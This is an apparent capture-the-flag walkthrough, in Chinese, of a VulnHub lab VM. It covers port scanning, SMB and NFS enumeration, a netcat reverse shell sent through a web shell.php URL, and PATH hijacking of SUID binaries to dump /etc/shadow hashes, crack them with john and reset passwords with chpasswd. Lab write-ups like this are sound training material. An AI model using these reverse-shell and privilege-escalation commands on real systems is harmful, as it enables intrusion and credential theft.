## port scan

```shell
# Nmap 7.94SVN scan initiated Fri Jan 24 02:11:55 2025 as: nmap --min-rate 10000 -p- -oN nmap_result/port 192.168.56.143
Nmap scan report for bogon (192.168.56.143)
Host is up (0.00050s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
34017/tcp open  unknown
37677/tcp open  unknown
48923/tcp open  unknown
51139/tcp open  unknown
```

```shell
# Nmap 7.94SVN scan initiated Fri Jan 24 02:21:13 2025 as: nmap -sT -sVC -O -p80,111,139,445,2049,34017,37677,48923,51139 -oN nmap_result/detils 192.168.56.143
Nmap scan report for bogon (192.168.56.143)
Host is up (0.0012s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36831/tcp6  mountd
|   100005  1,2,3      49338/udp   mountd
|   100005  1,2,3      51139/tcp   mountd
|   100005  1,2,3      59866/udp6  mountd
|   100021  1,3,4      36775/udp   nlockmgr
|   100021  1,3,4      37677/tcp   nlockmgr
|   100021  1,3,4      39329/tcp6  nlockmgr
|   100021  1,3,4      54940/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs         3-4 (RPC #100003)
34017/tcp open  mountd      1-3 (RPC #100005)
37677/tcp open  nlockmgr    1-4 (RPC #100021)
48923/tcp open  mountd      1-3 (RPC #100005)
51139/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:4B:86:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: LINUX

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: osboxes
|   NetBIOS computer name: LINUX\x00
|   Domain name: \x00
|   FQDN: osboxes
|_  System time: 2025-01-24T02:21:24-05:00
|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -2s
| smb2-time: 
|   date: 2025-01-24T07:21:24
|_  start_date: N/A
```

**smb服务测试枚举**

```
smbclient -L //IP
```

```
enum4linux-ng -A 192.168.56.143
```

```
smbmap --no-banner -H 192.168.56.143
```

**2049/tcp  open  nfs**

```shell
┌──(kali㉿kali)-[~/vulnhub/Escalate]
└─$ showmount -e 192.168.56.143      
Export list for 192.168.56.143:
/home/user5 *
```

```shell
┌──(kali㉿kali)-[~/vulnhub/Escalate]
└─$ mount -t nfs 192.168.56.143:/home/user5 /tmp/user5 -nolock
mount.nfs: failed to apply fstab options
```

## web

dirsearch 目录扫描到`shell.php`

http://192.168.56.143/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.56.138%201234%20%3E%2Ftmp%2Ff

拿到user6权限

## 提权

```
find / -type f -perm -4000 2>/dev/null
......
/home/user5/script
/home/user3/shell
```

两个64位可执行文件

`script`

```shell
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  setgid(0);
  system("ls");
  return 0;
}
```

`shell`

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  setgid(0);
  system("./.script.sh");
  return 0;
}
```

### 环境变量劫持

```shell
cd /tmp
echo "cat /etc/shadow" > ls
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script
```

拿到hash

```shell
┌──(kali㉿kali)-[~/vulnhub/Escalate]
└─$ cat hash              
root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::
user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::
user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::
user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::
user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::
user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::
user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::
mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::
user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::
user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::
```

john爆破拿到root密码：12345

![image-20250125145222841](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250125145222841.png)

有些用户密码不能爆破出来，可以尝试修改密码

你可以通过标准输入将用户名和密码传递给 `chpasswd`。例如，在命令行中：

```bash
echo "username:password" | sudo chpasswd
```

这里，`username` 是要更改密码的用户名，`password` 是新密码。

```shell
echo 'echo "user1:12345" | chpasswd' > ls
chmod 777 ls
export PATH=/tmp:$PATH
cd /home/user5
./script
su user1
```

### sudo

![image-20250125145527325](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250125145527325.png)

**/home/user3/shell**

```shell
cat .script.sh
echo "You Can't Find Me"
bash -i
```

直接执行shell文件即可，拿到root权限